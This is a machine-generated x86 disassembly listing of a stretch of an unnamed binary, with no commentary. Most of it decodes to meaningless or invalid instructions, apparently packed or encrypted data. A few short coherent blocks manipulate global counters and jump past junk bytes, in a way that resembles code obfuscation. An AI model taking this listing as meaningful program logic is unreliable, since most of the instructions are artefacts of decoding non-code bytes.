  411174:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411175:	call   0x6828:0x4d60d742
  41117c:	add    cl,BYTE PTR [ecx+0x2690db52]
  411182:	(bad)  
  411184:	aad    0x52
  411186:	loopne 0x4111d7
  411188:	jae    0x41114b
  41118a:	cmp    DWORD PTR [edi+0x1e604636],ecx
  411190:	cmp    al,0xce
  411192:	cmp    eax,0xacda84f3
  411197:	adc    eax,0x6a80fb3e
  41119c:	fs gs ds in al,0xa8
  4111a1:	xor    eax,0xced607b3
  4111a6:	lods   eax,DWORD PTR ds:[esi]
  4111a7:	ins    DWORD PTR es:[edi],dx
  4111a8:	mov    edi,0x8dc289ac
  4111ad:	xchg   ebx,eax
  4111ae:	mov    ah,0xf7
  4111b0:	sbb    DWORD PTR [edx],esp
  4111b2:	inc    eax
  4111b3:	repnz (bad) 
  4111b5:	(bad)  
  4111b6:	pop    ecx
  4111b7:	cld    
  4111b8:	cmp    ax,0x9eb2
  4111bc:	push   edx
  4111bd:	pop    ss
  4111be:	cmp    al,bl
  4111c0:	out    0xbc,eax
  4111c2:	ret    
  4111c3:	rcr    BYTE PTR [ebx+edi*4],1
  4111c6:	and    DWORD PTR [esi+0x44],edx
  4111c9:	xchg   ch,dh
  4111cb:	dec    edx
  4111cc:	pop    ss
  4111cd:	popa   
  4111ce:	mov    dl,0x4e
  4111d0:	jmp    0x4111e0
  4111d2:	mov    edx,0xa867b9cd
  4111d7:	mov    esp,0x4b7537b9
  4111dc:	test   al,0x89
  4111de:	loope  0x411239
  4111e0:	(bad)  
  4111e1:	xchg   edi,eax
  4111e2:	pushf  
  4111e3:	cmp    eax,DWORD PTR [eax-0x2]
  4111e6:	les    ecx,FWORD PTR [edi-0x3d]
  4111e9:	dec    edx
  4111ea:	imul   ebx,DWORD PTR [edx-0x32bf804e],0x55
  4111f1:	fild   DWORD PTR ds:0xaa436e66
  4111f7:	enter  0xcbc8,0xcd
  4111fb:	int    0xa8
  4111fd:	mov    cl,0xb1
  4111ff:	ins    DWORD PTR es:[edi],dx
  411200:	mov    ebx,0xfb52a23e
  411205:	push   0x1a
  411207:	pop    ebp
  411208:	adc    BYTE PTR [ecx-0x2efdd51b],0x45
  41120f:	popa   
  411210:	add    al,0x8d
  411212:	mov    esp,0x1eaeaf45
  411217:	push   ebx
  411218:	pop    esp
  411219:	mov    dl,0xbd
  41121b:	xor    BYTE PTR [esi],bh
  41121d:	inc    esp
  41121e:	inc    esp
  41121f:	out    0x5,eax
  411221:	or     DWORD PTR [edx+0x1122f6db],eax
  411227:	or     esp,DWORD PTR [edi+0x3ca46eb]
  41122d:	mov    al,BYTE PTR [edi+0x5d2373f7]
  411233:	mov    ebp,0xcd0b1cba
  411238:	sub    cl,bl
  41123a:	inc    ebp
  41123b:	mov    ch,0xb4
  41123d:	jno    0x41123f
  41123f:	ins    DWORD PTR es:[edi],dx
  411240:	jg     0x4111fb
  411242:	out    0x75,eax
  411244:	pop    edx
  411245:	daa    
  411246:	jle    0x41126f
  411248:	and    eax,0xba57f0fb
  41124d:	stos   BYTE PTR es:[edi],al
  41124e:	dec    ecx
  41124f:	pushf  
  411250:	mov    esp,0x7824001e
  411255:	div    BYTE PTR [ebx-0x3a]
  411258:	lock loop 0x41124d
  41125b:	fsubr  QWORD PTR [eax]
  41125d:	push   edi
  41125e:	pusha  
  41125f:	xor    eax,0x9d448924
  411264:	xchg   esp,eax
  411265:	inc    esi
  411266:	stos   BYTE PTR es:[edi],al
  411267:	fucomp st(6)
  411269:	mov    al,0xe
  41126b:	clc    
  41126c:	nop
  41126d:	cmp    al,0x85
  41126f:	loopne 0x4112e9
  411271:	inc    eax
  411272:	adc    ebp,DWORD PTR [edi]
  411274:	adc    DWORD PTR [esp+esi*1-0x19],edi
  411278:	rcl    DWORD PTR ds:0xc375402,0xf9
  41127f:	cld    
  411280:	imul   ebp,ecx,0x1d
  411283:	inc    eax
  411284:	jo     0x411272
  411286:	leave  
  411287:	stos   DWORD PTR es:[edi],eax
  411288:	les    edi,FWORD PTR [ebp+0x1dd26977]
  41128e:	add    DWORD PTR [eax],ecx
  411290:	inc    edi
  411291:	jae    0x411307
  411293:	adc    al,0x8a
  411295:	inc    edx
  411296:	es into 
  411298:	mov    fs,WORD PTR [ecx-0x4c8b616b]
  41129e:	mov    cl,0x6
  4112a0:	adc    ebp,DWORD PTR [ebp+0x57]
  4112a3:	or     eax,0x17cdb591
  4112a8:	dec    edi
  4112a9:	popf   
  4112aa:	retf   0x46f3
  4112ad:	ins    DWORD PTR es:[edi],dx
  4112ae:	aad    0x3b
  4112b0:	loop   0x411296
  4112b2:	adc    dh,BYTE PTR [eax+0x4fa6c76b]
  4112b8:	mov    BYTE PTR [esi+0x4e],cl
  4112bb:	cmp    edx,DWORD PTR [ebp-0x4b]
  4112be:	mov    ?,ecx
  4112c0:	and    eax,0x2832d1fa
  4112c5:	push   ss
  4112c6:	in     eax,dx
  4112c7:	xchg   edx,eax
  4112c8:	pop    ds
  4112c9:	push   edx
  4112ca:	xor    DWORD PTR [ecx+edx*2],edi
  4112cd:	out    0x0,eax
  4112cf:	add    BYTE PTR [ebx],cl
  4112d1:	push   ds
  4112d2:	pusha  
  4112d3:	jns    0x4112b9
  4112d5:	inc    edx
  4112d6:	push   0xffffffc9
  4112d8:	sub    cl,dl
  4112da:	(bad)  
  4112db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112dc:	pop    esi
  4112dd:	rep outs dx,DWORD PTR ds:[esi]
  4112df:	and    esi,DWORD PTR [ecx+0x7c]
  4112e2:	dec    esp
  4112e3:	add    dl,BYTE PTR [ebx+0x47]
  4112e6:	dec    esi
  4112e7:	xlat   BYTE PTR ds:[ebx]
  4112e8:	dec    eax
  4112e9:	push   eax
  4112ea:	or     al,0xea
  4112ec:	int3   
  4112ed:	mov    dl,BYTE PTR [esi+0x6f]
  4112f0:	cwde   
  4112f1:	cmc    
  4112f2:	sub    al,0x8b
  4112f4:	clc    
  4112f5:	inc    eax
  4112f6:	pop    ecx
  4112f7:	mov    dh,0x8f
  4112f9:	or     DWORD PTR [edi],eax
  4112fb:	ficomp WORD PTR [esi+0x30180383]
  411301:	sbb    BYTE PTR es:[eax-0x3a23b1ca],ch
  411308:	adc    ah,dh
  41130a:	loope  0x411364
  41130c:	jl     0x411381
  41130e:	psrad  mm0,QWORD PTR [ebp-0x12]
  411312:	dec    edx
  411313:	fnstcw WORD PTR [edx-0x40af0d66]
  411319:	sbb    edi,DWORD PTR [esi+0x3af35142]
  41131f:	jmp    0x41130c
  411321:	icebp  
  411322:	lods   eax,DWORD PTR ds:[esi]
  411323:	and    DWORD PTR ds:0xb624d5c5,ebp
  411329:	mov    bh,0x15
  41132b:	int    0xa4
  41132d:	xchg   esp,eax
  41132e:	pop    edi
  41132f:	or     eax,0xd6558bd1
  411334:	aaa    
  411335:	push   esi
  411336:	jmp    0x1f6e24ea
  41133b:	out    0x46,al
  41133d:	pop    edx
  41133e:	out    dx,al
  41133f:	retf   0x6a63
  411342:	rol    BYTE PTR [ebx+0xe932e2c],cl
  411348:	imul   ebp,DWORD PTR [edi-0x21474cb0],0x70
  41134f:	fsubr  DWORD PTR [edi-0x5eafe473]
  411355:	add    edx,DWORD PTR [edx+0x7bec5c33]
  41135b:	inc    ebx
  41135c:	adc    ah,BYTE PTR [ebp-0x5f]
  41135f:	cmc    
  411360:	inc    edx
  411361:	mov    al,0x1d
  411363:	sub    BYTE PTR [ebx-0x57],dl
  411366:	pop    esi
  411367:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411368:	ror    BYTE PTR [ebp-0x7f],cl
  41136b:	mov    eax,ds:0x762134dd
  411370:	jge    0x411393
  411372:	scas   al,BYTE PTR es:[edi]
  411373:	daa    
  411374:	jb     0x4113b9
  411376:	push   esi
  411377:	rol    BYTE PTR [ebx+0x25],1
  41137a:	cmp    DWORD PTR [ebx-0x30],ebx
  41137d:	cmp    BYTE PTR [edx],ch
  41137f:	or     eax,0xe575263a
  411385:	push   cs
  411386:	je     0x411382
  411388:	mov    ecx,ebx
  41138a:	mov    fs,WORD PTR [eax+0x3f]
  41138d:	xchg   BYTE PTR [di],ah
  411390:	jnp    0x411410
  411392:	in     al,0x27
  411394:	rcl    dl,cl
  411396:	xchg   edx,eax
  411397:	jo     0x41137c
  411399:	fisttp QWORD PTR [ecx+0x651fdc38]
  41139f:	ror    bl,0x39
  4113a2:	jnp    0x411338
  4113a4:	js     0x4113f0
  4113a6:	dec    edx
  4113a7:	push   eax
  4113a8:	mov    ecx,0xc328408b
  4113ad:	pop    ds
  4113ae:	push   0xa58cabb3
  4113b3:	push   eax
  4113b4:	nop
  4113b5:	loope  0x4113fd
  4113b7:	pop    edi
  4113b8:	inc    esi
  4113b9:	adc    DWORD PTR [edi-0x3e72a7b8],esi
  4113bf:	not    DWORD PTR [ecx+0x45]
  4113c2:	ja     0x41139a
  4113c4:	cmp    eax,esi
  4113c6:	mov    DWORD PTR ds:0x42fcf1,0x78e4
  4113d0:	je     0x411c9a
  4113d6:	mov    eax,ds:0x41b224
  4113db:	and    DWORD PTR ds:0x42fd7a,0x0
  4113e5:	mov    esi,DWORD PTR ds:0x42fd7a
  4113eb:	inc    esi
  4113ec:	mov    DWORD PTR ds:0x42fd7a,esi
  4113f2:	cmp    DWORD PTR ds:0x42fd7a,0x8
  4113f9:	jne    0x41140f
  4113ff:	push   0x42e1e7
  411404:	push   0x42e26d
  411409:	call   DWORD PTR ds:0x42e567
  41140f:	cmp    DWORD PTR ds:0x42fd7a,0x7
  411416:	jne    0x411429
  41141c:	mov    esi,DWORD PTR ds:0x42fd7a
  411422:	inc    esi
  411423:	mov    DWORD PTR ds:0x42fd7a,esi
  411429:	cmp    DWORD PTR ds:0x42fd7a,0x13
  411430:	jb     0x4113e5
  411436:	jmp    0x41183b
  41143b:	and    cl,al
  41143d:	leave  
  41143e:	adc    ch,cl
  411440:	adc    ecx,esp
  411442:	call   0xcb53bead
  411447:	nop
  411448:	inc    edi
  411449:	adc    eax,0x704a0eb6
  41144e:	jo     0x4114a8
  411450:	jge    0x4114c2
  411452:	jo     0x411471
  411454:	adc    BYTE PTR [eax+0x1c],0xc1
  411458:	cld    
  411459:	std    
  41145a:	add    al,0xfe
  41145c:	sub    bl,BYTE PTR [ebp-0x7996ad07]
  411462:	dec    esi
  411463:	div    BYTE PTR [esi-0x1ee83d15]
  411469:	and    BYTE PTR [edi-0x20],0x12
  41146d:	fldenv [esi+0x46]
  411470:	popa   
  411471:	fsubr  QWORD PTR [edx-0x16a6408e]
  411477:	cmp    eax,0xb8ff3577
  41147c:	int3   
  41147d:	out    0xed,eax
  41147f:	push   0x8
  411481:	fist   WORD PTR [ebx]
  411483:	scas   al,BYTE PTR es:[edi]
  411484:	int    0x82
  411486:	push   ecx
  411487:	inc    edi
  411488:	cli    
  411489:	shl    BYTE PTR [ebx],0x54
  41148c:	addr16 pop ecx
  41148e:	call   0xed9e:0x84586b01
  411495:	xchg   edi,eax
  411496:	xchg   esp,eax
  411497:	mov    dl,BYTE PTR [eax-0x69]
  41149a:	sub    BYTE PTR [esi+0x25],0x8c
  41149e:	push   eax
  41149f:	push   cs
  4114a0:	test   al,0x4
  4114a2:	and    DWORD PTR [edx+0x2e],eax
  4114a5:	out    dx,eax
  4114a6:	test   ebx,0x36efc8d7
  4114ac:	add    BYTE PTR [ebx+0x75],cl
  4114af:	mov    bh,0x20
  4114b1:	jbe    0x411454
  4114b3:	or     edi,esi
  4114b5:	mov    esi,0x1a416ba5
  4114ba:	or     dh,0xac
  4114bd:	mov    cs,WORD PTR [esi+edi*8-0x5024bd1]
  4114c4:	js     0x41147d
  4114c6:	addr16 jb 0x4114f8
  4114c9:	cwde   
  4114ca:	mov    ch,0xe1
  4114cc:	jge    0x411501
  4114ce:	(bad)  
  4114d0:	push   ebp
  4114d1:	call   0x8f64:0x35faed02
  4114d8:	cdq    
  4114d9:	scas   eax,DWORD PTR es:[edi]
  4114da:	stos   BYTE PTR es:[edi],al
  4114db:	dec    edi
  4114dc:	mov    bl,0xc6
  4114de:	cdq    
  4114df:	pop    edx
  4114e0:	test   esp,0xf1ec95c5
  4114e6:	or     ebp,esi
  4114e8:	test   BYTE PTR [ecx-0x3af9fe39],dl
  4114ee:	lds    ebx,FWORD PTR [edx]
  4114f0:	mov    al,0xcd
  4114f2:	stc    
  4114f3:	mov    BYTE PTR [eax+0x6d],cl
  4114f6:	fcmovnb st,st(6)
  4114f8:	pop    ss
  4114f9:	and    ah,BYTE PTR [edi+ecx*8+0x6c]
  4114fd:	outs   dx,BYTE PTR ds:[esi]
  4114fe:	sbb    al,BYTE PTR [edx-0x7e]
  411501:	pop    edx
  411502:	push   eax
  411503:	xor    eax,eax
  411505:	lds    edi,FWORD PTR [ecx]
  411507:	and    edx,DWORD PTR [esi+0x1a]
  41150a:	sbb    ebx,DWORD PTR [eax]
  41150c:	add    BYTE PTR [edi],bh
  41150e:	outs   dx,BYTE PTR ds:[esi]
  41150f:	mov    BYTE PTR [eax+0x79],dl
  411512:	addr16 add eax,0xdd68c107
  411518:	arpl   di,ax
  41151a:	ret    
  41151b:	pop    ds
  41151c:	sub    cl,bl
  41151e:	mov    edi,0xbd8d4bb3
  411523:	xor    eax,0xc6a9cd95
  411528:	mov    ds:0x3e483742,eax
  41152d:	mov    al,ds:0xe726cf96
  411532:	jecxz  0x4114b4
  411534:	or     BYTE PTR [ebp-0x3e7e9c20],0x8b
  41153b:	push   ebx
  41153c:	jle    0x41152e
  41153e:	mov    esp,0x319d372e
  411543:	mov    ecx,0xd05a2f4c
  411548:	jne    0x4115a4
  41154a:	(bad)  
  41154b:	lods   al,BYTE PTR ds:[esi]
  41154c:	jl     0x411552
  41154e:	push   esp
  41154f:	test   BYTE PTR [ecx+0x534380f1],ch
  411555:	dec    ebx
  411556:	cmp    al,0x83
  411558:	pop    ds
  411559:	push   cs
  41155a:	inc    ecx
  41155b:	add    al,0x39
  41155d:	fdivr  DWORD PTR [ebx+0x9]
  411560:	or     bh,BYTE PTR [ebx]
  411562:	cwde   
  411563:	outs   dx,BYTE PTR ds:[esi]
  411564:	mov    ecx,0x18b4a72f
  411569:	in     eax,0xdd
  41156b:	dec    esi
  41156c:	call   0xd6f6f221
  411571:	push   es
  411572:	sbb    al,0xad
  411574:	push   eax
  411575:	pushf  
  411576:	test   esp,esp
  411578:	mov    al,ds:0x9bea3b41
  41157d:	mov    ds:0xab244034,al
  411582:	or     bl,BYTE PTR [ecx+0x44]
  411585:	cwde   
  411586:	pop    edi
  411587:	lahf   
  411588:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411589:	test   BYTE PTR [ecx+0x39cc4a54],ah
  41158f:	sub    BYTE PTR [edi],dh
  411591:	xor    BYTE PTR [ebp+0x797b4708],0xd0
  411598:	cmp    BYTE PTR [ebx+edi*4-0x18673a08],ch
  41159f:	cmp    ebp,DWORD PTR [eax+ebx*8]
  4115a2:	daa    
  4115a3:	mov    ds:0x4ab8fd80,eax
  4115a8:	lods   al,BYTE PTR ds:[esi]
  4115a9:	icebp  
  4115aa:	call   0x424100e8
  4115af:	or     esi,eax
  4115b1:	pop    ecx
  4115b2:	mov    ds:0xfbc706ac,al
  4115b7:	sbb    cl,BYTE PTR [eax+0x32a5c30e]
  4115bd:	pop    eax
  4115be:	lods   al,BYTE PTR ds:[esi]
  4115bf:	pushf  
  4115c0:	ja     0x411550
  4115c2:	push   ss
  4115c3:	inc    edi
  4115c4:	jns    0x411578
  4115c6:	lahf   
  4115c7:	repnz rcr DWORD PTR [ebp-0x4e],1
  4115cb:	aaa    
  4115cc:	loope  0x411592
  4115ce:	cmp    BYTE PTR [ebp+0x2a12a04a],cl
  4115d4:	or     al,bl
  4115d6:	xchg   BYTE PTR [ecx-0x24],cl
  4115d9:	mov    ecx,0x9cacf6e1
  4115de:	(bad)
  4115e1:	rol    BYTE PTR [edi+0x4919a425],0x6f
  4115e8:	mov    DWORD PTR [ebp-0x58],ecx
  4115eb:	or     al,0xbb
  4115ed:	mov    bh,0x3d
  4115ef:	test   DWORD PTR [ecx],ebx
  4115f1:	add    DWORD PTR [eax+0xc],ecx
  4115f4:	(bad)  
  4115f5:	imul   DWORD PTR [ebx+0x61d8d568]
  4115fb:	call   0xf5b5:0xc10d50f8
  411602:	test   al,0xb0
  411604:	cmp    dl,BYTE PTR [ebx]
  411606:	or     ah,BYTE PTR [ebx-0x4d]
  411609:	in     al,0x3a
  41160b:	lds    ebp,FWORD PTR [esi-0x1b]
  41160e:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  411610:	int    0xb8
  411612:	imul   DWORD PTR [eax+eiz*1]
  411615:	nop
  411616:	or     bl,BYTE PTR [eax]
  411618:	mov    ecx,0x5bfd5801
  41161d:	into   
  41161e:	into   
  41161f:	mov    DWORD PTR [edx-0x51a3784c],0x4ea561d7
  411629:	scas   al,BYTE PTR es:[edi]
  41162a:	ins    DWORD PTR es:[edi],dx
  41162b:	xchg   ebx,eax
  41162c:	dec    ebp
  41162d:	into   
  41162e:	lea    edx,[edx-0x53]
  411631:	push   es
  411632:	in     al,dx
  411633:	out    dx,eax
  411634:	lods   eax,DWORD PTR ds:[esi]
  411635:	es hlt 
  411637:	xchg   esp,eax
  411638:	call   0x409b97e9
  41163d:	inc    esi
  41163e:	dec    edx
  41163f:	cmp    eax,0x61209674
  411644:	or     DWORD PTR [ecx-0x5761431f],edi
  41164a:	jo     0x4115e1
  41164c:	in     eax,0xd
  41164e:	xchg   esp,eax
  41164f:	sahf   
  411650:	mov    ch,BYTE PTR [ebx-0x2f]
  411653:	inc    edx
  411654:	jnp    0x411633
  411656:	jne    0x41165e
  411658:	jbe    0x411641
  41165a:	(bad)  
  41165b:	retf   0x5ae7
  41165e:	stc    
  41165f:	cmp    al,0xc2
  411661:	add    DWORD PTR [ebx],eax
  411663:	cli    
  411664:	xor    eax,0x4cfe08d1
  411669:	scas   eax,DWORD PTR es:[edi]
  41166a:	jbe    0x411662
  41166c:	outs   dx,DWORD PTR ds:[esi]
  41166d:	les    edi,FWORD PTR [edx+0x66]
  411670:	adc    DWORD PTR [edx-0x2],ebp
  411673:	or     ecx,DWORD PTR [esi-0x29ada9da]
  411679:	fbstp  TBYTE PTR [ebx+0x3e]
  41167c:	cmp    eax,ebx
  41167e:	dec    edx
  41167f:	add    BYTE PTR [ecx-0x53fd2326],bl
  411685:	push   cs
  411686:	jns    0x411681
  411688:	inc    esp
  411689:	add    al,0xbd
  41168b:	push   0x916a0fe
  411690:	sub    al,0xdd
  411692:	hlt    
  411693:	outs   dx,BYTE PTR ds:[esi]
  411694:	adc    DWORD PTR [eax+0x40],esp
  411697:	test   eax,0xee06f50d
  41169c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41169d:	ret    
  41169e:	mov    cs:0xbf8735b0,eax
  4116a4:	push   ss
  4116a5:	addr16 push ebx
  4116a7:	jb     0x411631
  4116a9:	inc    ebp
  4116aa:	jmp    0xfdf5d129
  4116af:	dec    edx
  4116b0:	xchg   edx,eax
  4116b1:	or     eax,0xa48a49b2
  4116b6:	out    dx,al
  4116b7:	in     al,dx
  4116b8:	outs   dx,DWORD PTR ds:[esi]
  4116b9:	(bad)  
  4116ba:	xchg   esi,eax
  4116bb:	(bad)  
  4116bc:	jmp    0x868b:0x1e12ec27
  4116c3:	cmp    DWORD PTR [ebp-0x28],esp
  4116c6:	mov    edx,0x16736c58
  4116cb:	pop    es
  4116cc:	addr16 mov ds:0x56ad,al
  4116d0:	cdq    
  4116d1:	leave  
  4116d2:	jle    0x4116ad
  4116d4:	add    ebp,esi
  4116d6:	push   ss
  4116d7:	lock mov ch,0xdd
  4116da:	pusha  
  4116db:	leave  
  4116dc:	dec    BYTE PTR [bx+si-0x18b9]
  4116e1:	xchg   esi,eax
  4116e2:	xor    eax,0x4e6b9e5d
  4116e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116e8:	shl    DWORD PTR [edi+0x449f0a50],cl
  4116ee:	ins    DWORD PTR es:[edi],dx
  4116ef:	sub    al,0x8f
  4116f1:	lock test DWORD PTR [esi],0x1f05b0b5
  4116f8:	gs je  0x411706
  4116fb:	xchg   ebp,eax
  4116fc:	fwait
  4116fd:	sub    al,0x4a
  4116ff:	lds    ebx,FWORD PTR [ecx-0x29d7a70f]
  411705:	sbb    DWORD PTR [ebx-0x2293451d],eax
  41170b:	xchg   esp,eax
  41170c:	aas    
  41170d:	sbb    eax,0x127e546b
  411712:	outs   dx,DWORD PTR ds:[esi]
  411713:	loope  0x4116f4
  411715:	int    0xee
  411717:	ins    DWORD PTR es:[edi],dx
  411718:	mul    DWORD PTR [eax+0x631bf9c2]
  41171e:	sub    al,0x20
  411720:	cmp    eax,0x462b4bc3
  411725:	ss and ecx,esi
  411728:	add    BYTE PTR [esi],dh
  41172a:	dec    edx
  41172b:	rep outs dx,DWORD PTR ds:[esi]
  41172d:	(bad)  
  41172e:	jmp    0x92b3:0xb06e011a
  411735:	aam    0x6f
  411737:	pop    ebx
  411738:	dec    ch
  41173a:	jo     0x4116f6
  41173c:	jb     0x4116e7
  41173e:	jne    0x41170f
  411740:	rcl    BYTE PTR [esi+0x6b],1
  411743:	pop    esp
  411744:	fcmove st,st(6)
  411746:	dec    ebx
  411747:	push   ds
  411748:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411749:	cld    
  41174a:	sbb    ch,al
  41174c:	loopne 0x411795
  41174e:	sbb    al,0x2a
  411750:	test   eax,0xf69cd62f
  411755:	retf   
  411756:	sahf   
  411757:	and    eax,0x9d95d42b
  41175c:	imul   ecx,DWORD PTR [edi+0x75],0xffffffc4
  411760:	pushf  
  411761:	std    
  411762:	dec    edx
  411763:	push   esi
  411764:	dec    edi
  411765:	add    edi,ebx
  411767:	daa    
  411768:	stos   BYTE PTR es:[edi],al
  411769:	xchg   esp,eax
  41176a:	popa   
  41176b:	add    ch,ah
  41176d:	lds    esi,FWORD PTR [eax]
  41176f:	(bad)  
  411770:	add    edi,DWORD PTR [esi]
  411772:	rcl    bl,0x3d
  411775:	in     eax,0x6
  411777:	daa    
  411778:	jle    0x411770
  41177a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41177b:	aaa    
  41177c:	dec    eax
  41177d:	jle    0x4117b6
  41177f:	arpl   WORD PTR [edx+0x5c],ax
  411782:	jmp    0x4117b7
  411784:	dec    edi
  411785:	cmp    ch,BYTE PTR [ebx]
  411787:	push   ss
  411788:	(bad)  [eax+0x11]
  41178b:	mov    ds:0x49737d4c,al
  411790:	fwait
  411791:	or     ebx,0x24127e08
  411797:	xchg   ebp,eax
  411798:	jmp    0x74639d2a
  41179d:	pushf  
  41179e:	jae    0x4117b2
  4117a0:	ret    0x1d77
  4117a3:	ret    0xadb6
  4117a6:	mov    DWORD PTR [edi-0x43],0x122b2297
  4117ad:	lods   al,BYTE PTR ds:[esi]
  4117ae:	pop    edx
  4117af:	jne    0x41173f
  4117b1:	cmp    al,0xa2
  4117b3:	add    al,0xb8
  4117b5:	arpl   WORD PTR [ecx-0x3d67d8d6],bx
  4117bb:	call   0x2265:0x2e7bb57c
  4117c2:	leave  
  4117c3:	lahf   
  4117c4:	shl    cl,cl
  4117c6:	ds test edi,edx
  4117c9:	jg     0x411817
  4117cb:	xchg   edx,eax
  4117cc:	push   ds
  4117cd:	mov    BYTE PTR [ecx-0x25ad1057],ah
  4117d3:	retf   0x7c01
  4117d6:	std    
  4117d7:	mov    fs,WORD PTR ds:[ecx-0x53]
  4117db:	in     eax,dx
  4117dc:	add    dl,ah
  4117de:	push   0xf74e548
  4117e3:	mov    bl,BYTE PTR [edi]
  4117e5:	mov    esi,0x35502837
  4117ea:	mov    al,BYTE PTR [esi-0x5a76260a]
  4117f0:	retf   
  4117f1:	jp     0x411788
  4117f3:	call   0x4defc1f9
  4117f8:	push   ss
  4117f9:	dec    ecx
  4117fa:	jecxz  0x4117d0
  4117fc:	ins    BYTE PTR es:[edi],dx
  4117fd:	pushf  
  4117fe:	push   0x53
  411800:	std    
  411801:	push   es
  411802:	fst    QWORD PTR [ebx+0x5e]
  411805:	ins    BYTE PTR es:[edi],dx
  411806:	sbb    BYTE PTR [edi-0x7ae611c9],dh
  41180c:	mov    WORD PTR [eax],ds
  41180e:	or     BYTE PTR [ebp+eax*2+0x54a33236],bl
  411815:	mov    edi,0xacbae8c9
  41181a:	cld    
  41181b:	sbb    al,0x78
  41181d:	imul   ebx,DWORD PTR [ebx],0xfb28cbc2
  411823:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411824:	je     0x411851
  411826:	in     al,0x39
  411828:	shr    DWORD PTR [esi+0x2e0fa407],cl
  41182e:	(bad)  
  41182f:	jp     0x411862
  411831:	xchg   DWORD PTR [edx+0x62],edi
  411834:	cmc    
  411835:	pop    es
  411836:	sbb    eax,0x12fe8a9a
  41183b:	mov    esi,DWORD PTR [ebp+0xc]
  41183e:	sub    eax,edx
  411840:	add    DWORD PTR ds:0x42fcf5,0x7f3f
  41184a:	xor    eax,ecx
  41184c:	mov    DWORD PTR ds:0x42fd7a,0x5771
  411856:	cmp    eax,esi
  411858:	mov    DWORD PTR ds:0x42fd76,0x752
  411862:	jne    0x411c7d
  411868:	jmp    0x411c6d
  41186d:	js     0x411844
  41186f:	stos   BYTE PTR es:[edi],al
  411870:	loopne 0x4118db
  411872:	jae    0x4118b6
  411874:	cmc    
  411875:	pop    esi
  411876:	sub    BYTE PTR [ecx+0x11d5dde9],dl
  41187c:	icebp  
  41187d:	jbe    0x4118d6
  41187f:	jo     0x4118f1
  411881:	pop    eax
  411882:	jge    0x4118f4
  411884:	jo     0x4118e0
  411886:	add    BYTE PTR [ecx+esi*2-0x7182ce07],0xe4
  41188e:	lds    ebx,FWORD PTR [ecx-0x13a830b9]
  411894:	adc    DWORD PTR [edi],esi
  411896:	pandn  mm4,QWORD PTR [esi]
  411899:	fwait
  41189a:	repz push ds
  41189c:	xor    eax,0xca520a17
  4118a1:	xlat   BYTE PTR ds:[ebx]
  4118a2:	addr16 add al,0xef
  4118a5:	(bad)  
  4118a6:	repz add ebx,ebp
  4118a9:	shr    dh,1
  4118ab:	out    dx,al
  4118ac:	pop    edi
  4118ad:	mov    eax,ds:0xeb926f1c
  4118b2:	test   eax,0x8d873c3
  4118b7:	cld    
  4118b8:	fcom   QWORD PTR [edi+0x1264d6db]
  4118be:	xor    al,0xcf
  4118c0:	retf   0xa328
  4118c3:	push   ecx
  4118c4:	retf   
  4118c5:	mov    dh,0xde
  4118c7:	mov    ebx,0x9b0bef74
  4118cc:	pop    ds
  4118cd:	out    0x8c,al
  4118cf:	cli    
  4118d0:	aam    0x88
  4118d2:	(bad)  
  4118d4:	into   
  4118d5:	pop    ebx
  4118d6:	stos   BYTE PTR es:[edi],al
  4118d7:	cwde   
  4118d8:	mov    ah,BYTE PTR [ebx]
  4118da:	leave  
  4118db:	or     BYTE PTR fs:[edi],0xb9
  4118df:	mov    al,ds:0xf2b02109
  4118e4:	adc    esp,DWORD PTR [edi-0x6bb4ee03]
  4118ea:	iret   
  4118eb:	sub    DWORD PTR [eax-0x694d509e],0x60
  4118f2:	add    BYTE PTR [ebx+0x5d11a7c0],bl
  4118f8:	outs   dx,DWORD PTR ds:[esi]
  4118f9:	ins    BYTE PTR es:[edi],dx
  4118fa:	call   0xd499:0x238bf46d
  411901:	sti    
  411902:	push   ebp
  411903:	cmc    
  411904:	push   edx
  411905:	jb     0x41197e
  411907:	push   esp
  411908:	mov    esi,0x931542c0
  41190d:	jbe    0x4118fb
  41190f:	push   ebx
  411910:	pushf  
  411911:	jne    0x41197e
  411913:	push   esp
  411914:	add    eax,0x4ac7c364
  411919:	rol    esp,0xb7
  41191c:	add    cl,BYTE PTR [edi-0x1c]
  41191f:	mov    edx,ecx
  411921:	rol    BYTE PTR [eax+0x68],1
  411924:	dec    edx
  411925:	dec    edx
  411926:	add    bh,BYTE PTR [edi-0x31]
  411929:	adc    DWORD PTR [edi-0x48],0x50
  41192d:	loop   0x4118e2
  41192f:	xchg   esp,eax
  411930:	outs   dx,DWORD PTR ds:[esi]
  411931:	push   esp
  411932:	cmp    ebx,DWORD PTR [ebp+eiz*1-0x33018a38]
  411939:	(bad)  [ebp-0x6e]
  41193c:	inc    esp
  41193d:	mov    ch,BYTE PTR [edx+edi*8]
  411940:	adc    BYTE PTR [edx+0x78ffcb3c],0x71
  411947:	adc    esi,ebp
  411949:	xchg   edi,eax
  41194a:	daa    
  41194b:	lods   eax,DWORD PTR ds:[esi]
  41194c:	fdivr  QWORD PTR [edi-0x5d5a8142]
  411952:	scas   al,BYTE PTR es:[edi]
  411953:	pusha  
  411954:	mov    ah,0xbe
  411956:	mov    ebp,0xdd97022a
  41195b:	into   
  41195c:	mov    eax,ds:0x7229f674
  411961:	adc    dh,BYTE PTR [eax+0x13]
  411964:	mov    ds:0xa8f4267e,al
  411969:	push   edx
  41196a:	fiadd  DWORD PTR [ebx+0x2f3ba5c]
  411970:	jne    0x41192a
  411972:	cmp    edx,DWORD PTR [esi+0x48]
  411975:	push   ds
  411976:	mov    al,dh
  411978:	add    BYTE PTR [esi+0x7922675d],al
  41197e:	test   BYTE PTR [ebx+0x78770f22],dl
  411984:	pop    ecx
  411986:	lahf   
  411987:	cmp    eax,ebp
  411989:	lea    ecx,[edi+edi*1+0x65]
  41198d:	ret    
  41198e:	sub    eax,0xdc671a46
  411993:	adc    ecx,DWORD PTR [esi+0x69]
  411996:	std    
  411997:	mov    al,0x1
  411999:	loop   0x4119ee
  41199b:	dec    ebx
